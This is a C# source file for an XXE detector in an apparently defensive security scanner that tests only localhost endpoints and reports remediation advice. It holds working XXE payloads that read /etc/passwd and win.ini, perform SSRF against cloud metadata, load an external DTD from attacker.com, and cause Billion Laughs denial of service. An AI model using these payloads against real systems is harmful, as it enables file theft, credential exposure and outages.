using System.Text;
using System.Xml;
using VaultScope.Core.Constants;
using VaultScope.Core.Interfaces;
using VaultScope.Core.Models;

namespace VaultScope.Security.Detectors;

public class XxeDetector : IVulnerabilityDetector
{
    private readonly HttpClient _httpClient;
    private readonly IUrlValidator _urlValidator;
    
    public VulnerabilityType Type => VulnerabilityType.XmlExternalEntity;
    public string Name => "XML External Entity (XXE) Detector";
    public string Description => "Detects XXE vulnerabilities in XML processing endpoints";
    public int Priority => 90;
    
    public XxeDetector(HttpClient httpClient, IUrlValidator urlValidator)
    {
        _httpClient = httpClient;
        _urlValidator = urlValidator;
    }
    
    public async Task<List<Vulnerability>> DetectAsync(
        string endpoint,
        HttpMethod method,
        AuthenticationResult? authentication = null,
        CancellationToken cancellationToken = default)
    {
        var vulnerabilities = new List<Vulnerability>();
        
        if (!_urlValidator.IsLocalhost(endpoint))
            return vulnerabilities;
        
        // Only test endpoints that might process XML
        if (!IsXmlEndpoint(endpoint, method))
            return vulnerabilities;
        
        var payloads = GetXxePayloads();
        
        foreach (var payload in payloads)
        {
            try
            {
                var vulnerability = await TestPayloadAsync(endpoint, method, payload, authentication, cancellationToken);
                if (vulnerability != null)
                {
                    vulnerabilities.Add(vulnerability);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error testing XXE: {ex.Message}");
            }
        }
        
        return vulnerabilities;
    }
    
    public bool IsApplicable(string endpoint, HttpMethod method)
    {
        return IsXmlEndpoint(endpoint, method);
    }
    
    private bool IsXmlEndpoint(string endpoint, HttpMethod method)
    {
        // Check if endpoint accepts XML
        if (endpoint.Contains("/xml", StringComparison.OrdinalIgnoreCase) ||
            endpoint.Contains("/soap", StringComparison.OrdinalIgnoreCase) ||
            endpoint.Contains("/wsdl", StringComparison.OrdinalIgnoreCase))
        {
            return true;
        }
        
        // Only test POST/PUT/PATCH methods for XXE
        return method == HttpMethod.Post || method == HttpMethod.Put || method.Method == "PATCH";
    }
    
    private async Task<Vulnerability?> TestPayloadAsync(
        string endpoint,
        HttpMethod method,
        XxePayload payload,
        AuthenticationResult? authentication,
        CancellationToken cancellationToken)
    {
        var request = new HttpRequestMessage(method, endpoint);
        
        if (authentication != null)
        {
            foreach (var header in authentication.Headers)
            {
                request.Headers.TryAddWithoutValidation(header.Key, header.Value);
            }
        }
        
        request.Content = new StringContent(payload.Xml, Encoding.UTF8, "application/xml");
        
        var response = await _httpClient.SendAsync(request, cancellationToken);
        var content = await response.Content.ReadAsStringAsync();
        
        if (IsXxeVulnerable(content, payload))
        {
            return CreateVulnerability(endpoint, method, payload, content);
        }
        
        return null;
    }
    
    private bool IsXxeVulnerable(string responseContent, XxePayload payload)
    {
        // Check for successful XXE indicators
        foreach (var indicator in payload.Indicators)
        {
            if (responseContent.Contains(indicator, StringComparison.OrdinalIgnoreCase))
            {
                return true;
            }
        }
        
        // Check for error messages that indicate XXE processing
        var xxeErrors = new[]
        {
            "external entity",
            "DOCTYPE",
            "ENTITY",
            "file://",
            "expect://",
            "php://",
            "/etc/passwd",
            "C:\\Windows",
            "root:x:0:0",
            "Failed to load external entity"
        };
        
        return xxeErrors.Any(error => responseContent.Contains(error, StringComparison.OrdinalIgnoreCase));
    }
    
    private Vulnerability CreateVulnerability(
        string endpoint,
        HttpMethod method,
        XxePayload payload,
        string responseContent)
    {
        return new Vulnerability
        {
            Type = VulnerabilityTypes.XmlExternalEntity,
            Severity = VulnerabilitySeverity.Critical,
            Title = "XML External Entity (XXE) Vulnerability Detected",
            Description = $"The endpoint processes XML with external entities enabled. Type: {payload.Type}. " +
                         "This could allow an attacker to read internal files, perform SSRF attacks, or cause denial of service.",
            AffectedEndpoint = endpoint,
            HttpMethod = method.Method,
            PayloadUsed = payload.Xml,
            Evidence = $"XXE payload was processed. Response contained indicators of {payload.Type} XXE.",
            Remediation = "Disable XML external entity processing. " +
                         "Use less complex data formats like JSON if possible. " +
                         "If XML is required, configure the XML parser to disable DTDs and external entities. " +
                         "Validate and sanitize XML input against a whitelist.",
            CweId = VulnerabilityTypes.CweIds[VulnerabilityTypes.XmlExternalEntity],
            OwaspCategory = "A05:2021 - Security Misconfiguration",
            ConfidenceScore = 0.95,
            Metadata = new Dictionary<string, object>
            {
                ["xxe_type"] = payload.Type,
                ["response_length"] = responseContent.Length
            }
        };
    }
    
    private List<XxePayload> GetXxePayloads()
    {
        return new List<XxePayload>
        {
            // Basic file disclosure
            new XxePayload
            {
                Type = "File Disclosure",
                Xml = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM ""file:///etc/passwd"">
]>
<root>&xxe;</root>",
                Indicators = new[] { "root:x:0:0", "/bin/bash", "nobody:x:" }
            },
            
            // Windows file disclosure
            new XxePayload
            {
                Type = "Windows File Disclosure",
                Xml = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM ""file:///C:/Windows/win.ini"">
]>
<root>&xxe;</root>",
                Indicators = new[] { "[fonts]", "[extensions]", "[mci extensions]" }
            },
            
            // SSRF via XXE
            new XxePayload
            {
                Type = "SSRF",
                Xml = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM ""http://169.254.169.254/latest/meta-data/"">
]>
<root>&xxe;</root>",
                Indicators = new[] { "ami-id", "instance-id", "local-ipv4" }
            },
            
            // Blind XXE with external DTD
            new XxePayload
            {
                Type = "Blind XXE",
                Xml = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE root SYSTEM ""http://attacker.com/xxe.dtd"">
<root>test</root>",
                Indicators = new[] { "attacker.com", "xxe.dtd" }
            },
            
            // Parameter Entity XXE
            new XxePayload
            {
                Type = "Parameter Entity",
                Xml = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE root [
    <!ENTITY % file SYSTEM ""file:///etc/passwd"">
    <!ENTITY % eval ""<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"">
    %eval;
    %error;
]>
<root>test</root>",
                Indicators = new[] { "root:x:0:0", "Failed to load", "nonexistent" }
            },
            
            // Billion Laughs DoS
            new XxePayload
            {
                Type = "DoS",
                Xml = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE lolz [
    <!ENTITY lol ""lol"">
    <!ENTITY lol2 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"">
    <!ENTITY lol3 ""&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"">
]>
<lolz>&lol3;</lolz>",
                Indicators = new[] { "entity reference loop", "recursive entity", "maximum" }
            }
        };
    }
    
    private class XxePayload
    {
        public string Type { get; set; } = string.Empty;
        public string Xml { get; set; } = string.Empty;
        public string[] Indicators { get; set; } = Array.Empty<string>();
    }
}